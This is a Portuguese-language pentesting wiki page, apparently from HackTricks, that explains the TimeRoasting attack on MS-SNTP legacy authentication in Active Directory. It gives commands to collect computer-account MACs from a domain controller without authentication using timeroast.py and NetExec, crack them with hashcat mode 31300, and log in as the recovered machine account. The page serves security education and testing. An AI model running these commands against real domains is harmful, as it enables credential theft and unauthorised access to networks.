# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting explora a autenticação legada do MS-SNTP. Um cliente não autenticado pode enviar uma solicitação de 68 bytes contendo um RID de conta de computador escolhido. No caminho legado explorável, o controlador de domínio deriva o autenticador da resposta por meio do Netlogon, usando o hash NT da conta de computador (o segredo de senha derivado de MD4), fornecendo um par challenge/MAC adequado para tentativa offline de senhas (Hashcat mode 31300).<sup>[[1]](#references)[[2]](#references)</sup>

As seções 3.1.5.1 e 4 do MS-SNTP descrevem o comportamento da solicitação e da resposta:<sup>[[1]](#references)</sup>
![TimeRoasting: Consulte a seção 3.1.5.1 "Authentication Request Behavior" e a seção 4 "Protocol Examples" da especificação oficial do MS-SNTP para obter detalhes](../../images/Pasted%20image%2020250709114508.png)
Quando `ExtendedAuthenticatorSupported` é false, a solicitação armazena o RID nos 31 bits inferiores do Key Identifier do autenticador e um bit seletor no bit superior. O servidor verifica o tamanho de 68 bytes, extrai o RID, solicita ao Netlogon que calcule os checksums candidatos, seleciona um deles usando esse bit superior, zera o Key Identifier da resposta e retorna o checksum selecionado.<sup>[[1]](#references)</sup>

O crypto-checksum é baseado em MD5 (consulte 3.2.5.1.1) e pode ser quebrado offline, possibilitando o ataque de roasting.<sup>[[1]](#references)</sup>

## How to Attack

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - scripts de Timeroasting de Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Ataque prático (não autenticado) com NetExec + Hashcat

- O módulo `timeroast` do NetExec pode enumerar RIDs de computadores, coletar MACs MS-SNTP sem autenticação e exibir hashes `$sntp-ms$` prontos para cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack offline com Hashcat modo 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- O cleartext recuperado corresponde à senha de uma conta de computador. Tente-o diretamente como a conta de máquina usando Kerberos (-k) quando NTLM estiver desabilitado:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
### Notas operacionais
- Garanta que o horário esteja correto antes de usar credenciais recuperadas com Kerberos. Prefira um cliente NTP mantido, como `chronyd`/`systemd-timesyncd`; `ntpdate` é mantido aqui como um comando comum de laboratório: `sudo ntpdate <dc_fqdn>`.
- Se necessário, gere o krb5.conf para o realm do AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Mapeie os RIDs para principals posteriormente via LDAP/BloodHound assim que você tiver qualquer foothold autenticado.

## References

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – whitepaper sobre Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec — código-fonte do módulo `timeroast`](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)
{{#include ../../banners/hacktricks-training.md}}
